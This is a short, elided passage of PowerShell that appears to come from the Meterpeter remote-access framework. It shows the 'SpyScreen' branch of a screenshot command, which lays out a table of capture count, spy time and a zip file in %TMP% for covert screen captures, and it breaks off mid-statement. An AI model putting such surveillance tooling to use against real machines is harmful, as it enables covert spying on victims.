    ...
    If($Command -ieq "Screenshot")
    {
        ...
        If($choise_two -ieq "SpyScreen")
        {
           ...
           If($Captures -gt 3 -or $Inbetween -gt 5)
           {
              ...
              $SpyTable = New-Object System.Data.DataTable
              $SpyTable.Columns.Add("   Captures")|Out-Null
              $SpyTable.Columns.Add("   MaxSpyTime")|Out-Null
              $SpyTable.Columns.Add("   RemoteStorage")|Out-Null

              $SpyTable.Rows.Add("$Captures",
                                 "$TotalSpyTime(seconds)",
                                 "%TMP%\Meterpeter_random.zip"
              )|Out-Null

              $SpyTable | Format-List | Out-String -Stream | ForEach-Object {
                 $stringformat = If($_ -Match '^(   Captures)')
                 {
                    @{ 'ForegroundColor' = 'Green' }
                 }
                 ElseIf($_ -Match '^(   MaxSpyTime)')
                 {
